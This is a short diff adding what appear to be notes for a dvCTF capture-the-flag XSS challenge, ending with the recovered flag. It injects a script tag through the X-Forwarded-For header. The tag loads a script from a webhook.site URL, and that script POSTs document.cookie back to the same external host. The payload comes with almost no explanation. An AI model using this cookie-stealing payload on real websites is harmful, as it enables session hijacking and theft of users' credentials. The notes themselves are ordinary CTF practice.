@@ -1,0 +1,16 @@
+XSS
+	X-Forwarded-For: <script>alert(1)</script>
+
+
+X-Forwarded-For: <script src="https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a"></script>
+
+webhook.site
+	Content Type: text/html
+	Response Body
+	```
+	var xhr = new XMLHttpRequest();
+	xhr.open("POST", "https://webhook.site/5148d880-fcfd-42dd-b595-af23e42c3c4a/cookie");
+	xhr.send(document.cookie);
+	```
+
+flag=dvCTF{xss_l0ve<3}
